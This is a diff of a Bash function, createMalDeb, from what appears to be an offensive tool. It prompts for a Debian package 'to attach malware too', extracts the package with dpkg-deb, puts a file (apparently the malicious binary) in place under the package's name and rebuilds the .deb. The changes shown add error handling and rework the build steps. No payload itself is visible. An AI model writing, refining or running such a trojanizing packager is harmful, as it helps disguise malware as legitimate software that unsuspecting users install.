@@ -64,16 +64,19 @@ createMalDeb() {
 			;;
 	    n|N)
 		while :;do
-		    printf "${open}${bold}${green}%s${close}" "Specify the package to attach malware too: " ; read -e attachToPackage
+		    printf "${open}${bold}${green}%s${close}" \
+			   "Specify the package to attach malware too: " ; read -e attachToPackage
 		    printf "\n"
+		    
 		    [[ -z "${attachToPackage}" ]] && continue # Check if attachToPackage is null
 		    
 		    # The file command will show you the type of file $attachToPackage is
 		    local checkIfDeb=$(file $attachToPackage)  
 
 		    if [[ "${checkIfDeb}" =~ "Debian binary package" ]];then
-
-			dpkg -x "${attachToPackage}" .  # Extract the debian pacakage in the current directory
+			
+			# Extract the debian pacakage in the current directory
+			dpkg-deb --raw-extract "${attachToPackage}" . 
 
 			# extract the name of the pacakge
 			packageName="${attachToPackage%%_*}"
@@ -92,11 +95,28 @@ createMalDeb() {
 			    chk_file
 			    mv ${dirfile%%.*} "${packageName}"
 			    cd -
-			    dpkg --build usr
+			    mkdir ${attachToPackage%.deb*}
+			    mv DEBIAN usr/ ${attachToPackage%.deb*}
+			    dpkg --build ${attachToPackage%.deb*} 1>/dev/null 
+			    local status=$?
+			    
+			    (( status != 0 )) && {
+				
+				rm -rf ${attachToPackage%.deb*}
+				printf "${open}${bold}${red}%s${close}\n" \
+				       "Fatal Error While packaging ${attachToPackage%.deb*}"
+				return 1;
+				
+			    }
+			    
+			    rm -rf ${attachToPackage%.deb*}
+			    return 0;
+			    
 			fi
 
 			
-			printf "${open}${bold}${yellow}%s{close}\n" "[!]${attachToPackage} does not have a usr/bin directory"
+			printf "${open}${bold}${yellow}%s{close}\n" \
+			       "[!]${attachToPackage} does not have a usr/bin directory"
 			exit 2
 			    
 			
